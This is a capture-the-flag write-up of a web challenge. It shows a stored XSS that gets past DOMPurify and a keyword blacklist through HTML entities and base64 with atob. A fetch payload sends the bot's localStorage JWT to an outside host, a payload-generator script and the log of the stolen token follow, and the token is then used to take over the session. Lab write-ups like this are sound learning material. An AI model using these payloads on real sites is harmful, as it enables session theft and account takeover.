# justPocketTheBase

## Description
```
The thing I love the most about ready-to-use backends and frameworks is that they are always secure :)

-http://justpocketthebase.web.jctf.pro
```

## Provided Files
```
- justpocketthebase_docker.tar.gz
```

## Writeup

> [!NOTE]
> Credit to [Profiluefter](https://github.com/profiluefter) and [lavish](https://github.com/lavish) who worked together with me on this challenge.

Starting off by taking a look at the website before inspecting the provided code. <br/>
After creating an account we are able to create plants with a custom `title` and a custom `image` we provide which will be stored in the application and can be accessed via `/view-plant?id=[ID]`. <br/>
Custom character-blacklist:  <br/>
```js
let blacklist = [
	'window',
	'document',
	'cookie',
	'fetch',
	'navigator',
	'sendbeacon',
	'+',
	'_',
	'script',
	'!',
	'"',
	'#',
	'%',
	"'",
	'(',
	')',
	'*',
	'+',
	',',
	'-',
	'/',
	':',
	'?',
	'@',
	'[',
	']',
	';'
];

const sanitizedTitle = DOMPurify.sanitize(plant.title);
const newTitleElement = document.createElement('div');
newTitleElement.classList.add('title');
newTitleElement.innerHTML = sanitizedTitle;
const safe = newTitleElement.innerText;
try {
        if (blacklist.some((word) => safe.toLowerCase().includes(word))) {
		throw new Error('not safe!!!');
	}
	title.innerHTML = safe;
} catch (err) {
	window.location.href = '/';
}
```

A reporting option on the website indicates a possible `XSS` vulnerabiltiy, so we analyzed the `sanitization-process` for the title element of a new post. <br/>

The `dompurify` can be bypassed using [HTML-Entity-Characters](https://html.com/character-codes/) by simply encoding `<` and `>`. <br/>
After the dompurify our input will be decoded meaning the same approach wouldn't work to bypass the `custom-blacklist`. <br/>

It's possible to execute XSS via the `title` of a new plant by exchanging **()** with **``**. <br/>
```js
&lt;img src=1 onerror=alert`1`&gt;
// &lt; == <
// &gt; == >
```
Although this confirmed our suspicion, it didn't help much because the `custom-blacklist` still blocked valuable characters which we need. <br/>  

After knowing that we are successfully able to execute a `Cross-Site-Scripting-Attack` via title we were now searching for a possible way to bypass the `custom-blacklist` which disallows important characters like `/`. <br/>
To find a way around this issue we tried an approach using a `base64` encoded payload which can be decoded using the `builtin` javascript function `atob` (ASCII to Binary). <br/>
This would bypass the `custom-blacklist` as our encoded payload doesn't contain the actual characters like `/` or `:`. <br/>
Using [PortSwigger-Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-tag-with-base64-encoding) we found a way to execute our encoded payload. <br/>
```js
&lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`&gt;
```

Making a script to enchance efficiency: <br/>
```py
import base64

payload = 'JAVASCRIPT-PAYLOAD'

print(f'&lt;img src=1 onerror=location=atob`{base64.b64encode(bytes(f"javascript:{payload}", "utf-8"))}`&gt;')
```

Leak localstorage which contains the JWT of the bot: <br/>
```js
&lt;img src=1 onerror=location=atob`amF2YXNjcmlwdDpmZXRjaChgaHR0cHM6Ly9hcnl0My5kZXYvJHtsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIil9YCk=`&gt;

// fetch(`https://aryt3.dev/${localStorage.getItem("pocketbase_auth")}`)
```

Server Logs after reporting the webpage: <br/>
```
167.71.14.123 - - [15/Jun/2024:13:54:43 +0200] "GET /%7B%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjIwODIsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.LqdYoqEO8cDmOgertTUt5FsmP6jUfDM0Z-GEbEJwBkc%22,%22model%22:%7B%22avatar%22:%22%22,%22collectionId%22:%22_pb_users_auth_%22,%22collectionName%22:%22users%22,%22created%22:%222024-06-15%2010:52:23.378Z%22,%22email%22:%22%22,%22emailVisibility%22:false,%22id%22:%22ebm7wofy99nmb4b%22,%22name%22:%22%22,%22updated%22:%222024-06-15%2010:52:23.378Z%22,%22username%22:%22flag%22,%22verified%22:false%7D%7D HTTP/1.1" 502 559 "http://localhost/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36"
```

URL-Decoded:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb2xsZWN0aW9uSWQiOiJfcGJfdXNlcnNfYXV0aF8iLCJleHAiOjE3MTk2NjI2OTcsImlkIjoiZWJtN3dvZnk5OW5tYjRiIiwidHlwZSI6ImF1dGhSZWNvcmQifQ.hSvcypOCNSsIYeXJ-JZE4H7vWnt7UFvrzAoMBkxwVp0","model":{"avatar":"","collectionId":"_pb_users_auth_","collectionName":"users","created":"2024-06-15 10:52:23.378Z","email":"","emailVisibility":false,"id":"ebm7wofy99nmb4b","name":"","updated":"2024-06-15 10:52:23.378Z","username":"flag","verified":false}}
```

Having obtained the whole localstorage-item `pocketbase_auth`, we switched ours with this one. <br/>
After that we were able to access the post with the `flag-image` and download the picture. <br/>
Afterwards we inspected the image in the `admin-post` which revealed the flag and concludes this writeup. <br/>
```sh
$ exiftool flag_gygEshYymV.png 
ExifTool Version Number         : 12.76
File Name                       : flag_gygEshYymV.png

---------------------------------------------------------

Artist                          : justCTF{97603333-6596-43fe-aef8-a134c1cc11b4}
```